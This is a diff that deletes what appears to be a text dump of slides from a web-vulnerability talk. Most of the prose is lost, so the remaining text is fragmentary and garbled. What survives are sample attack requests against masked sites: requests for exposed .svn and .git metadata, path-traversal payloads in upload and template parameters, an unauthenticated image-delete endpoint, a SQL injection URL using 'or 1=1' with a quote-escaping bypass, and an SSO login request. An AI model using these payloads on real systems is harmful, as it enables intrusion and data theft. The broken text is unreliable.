@@ -1,95 +1,0 @@
-
-Valo@wooyun
-
-01 ""
-svn: xxx.xxx.com/.svn/entries
-
-01 ""
-git: xxx.xxx.com/.git/config
-
-01 ""
-github
-
-01 ""
-github
-
-
-
-
-
-
-
-VPN
-
-
-
-
-
-
-
-50/180
-
-02 Rsync
-nfs
-
-03 
-
-
-04 
-
-05 ""
-
-06 ""
-
-06 ""
-http://xxxxx.com/feedBack/addSuggest.php?mod=addSuggest&suggestBelonged =,1,aaa&suggestType=,1,&suggestDescrib=test&contactTel=test&contactEmail=t est&contactQQ=111&contactPerson=test&attachValue=../2014/testinfo.html._7.jp g Warning: rename(/mnt/mfsxxxx/feedBack/../2014/testinfo.html._7.jpg,/mnt/mfs/xxxx/feedBa ck/../2014/2014111801267-1.html): No such file or directory in /apps/dat/web/newcode/xxxx-239/library/App/FeedBack/Suggest.php on line 257
-
-06 ""
-http://xxcom/vendor/goodsAdd.php?mod=showTem plate&template=3c/../../../../../../../../../../../../../../../../m nt/mfs/xxxx/2014/2014111801266-1
-
-07 ""2
-https://www.xxxxxxx.com/guarantee 
-js/admin.js function delImg(_this){
-var pic = $(_this).attr("rel");
-$.post("/app/uploadimage?act=delimg",{image:pic},functi on(data){
-if(data.status=='200'){ alert(data.msg); $(_this).closest('.showimg').find('img').attr('src',
-'/img/x_tu.jpg'); // $(_this).remove(); //
-}else{ alert('xxxxx');
-} },'json'); }
-
-08 ""3
-
-08 ""3
-
-09 ""
-
-10 
-
-11 ""
-
-12 SQL
-
-13 SQL
-http://xxxxcom/index.php?action=user&method=search&pos_belong=2 &pos_city=0&pos_type=0&keywords=a\%27%20or%201=1%20limit%2 00,10%23
- keywords  replace ' ''  \'  \'' 
-
-14 ""
-
-15 "shell"
-
-16 ""
-scitdlocalhost31415 bugreport a_test-count, command injectiondebug  
-
-17 ""
-
-18 -""
-POST /network/SsoLogonAction.do HTTP/1.1 Hostxxxxx.com.cn Connection: keep-alive Content-Length: 145 Cache-Control: max-age=0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-method=logon&checktrade=0&directPath=&needGetPassWord=0&logonT ype=1&ssoLoginFlag=0&identityType=0&identityNo=6422xxxxx01080813 &returnUrl=&novc=y
-
-
-
-Good Job
-
-THANKS
-
-
